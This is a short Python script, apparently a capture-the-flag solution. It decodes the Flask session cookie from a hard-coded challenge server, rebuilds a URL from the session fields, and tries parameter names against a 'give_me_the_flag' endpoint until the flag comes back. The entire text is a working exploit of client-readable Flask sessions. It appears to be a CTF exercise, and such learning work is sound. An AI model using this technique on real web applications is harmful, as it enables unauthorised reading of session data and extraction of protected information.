import requests
import zlib
import itsdangerous # itsdangerous has different base64 decoder designed for Flask session
import base64       # just an ordinary base64 decoder
import json
import time

base_url = 'http://203.34.119.237:40003/'
ses = requests.Session()
cqi = ses.get(base_url).cookies.get_dict()
assert 'session' in cqi, 'wrong base url?'
cur_ses = json.loads(
    zlib.decompress(
        itsdangerous.base64_decode(
            cqi['session'][1:].split('.')[0]
            )
        )
    )
get_ = lambda k: base64.b64decode(cur_ses[k][cur_ses[k].keys()[0]])
get = lambda k: get_(k)[:len(get_(k))-1]
url = '%s://%s%s?%s#%s' % (
    get('scheme'),
    get('netloc'),
    get('path'),
    get('query'),
    get('fragment')
)
possible_params = ['a', 'b', 'c', 'd', 'f', 'e']
while 'x' not in locals():
    for param in possible_params:
        flag = ses.get(base_url + 'give_me_the_flag', params={param: url}).text
        if '{' in flag:
            x = flag
            break
print(x)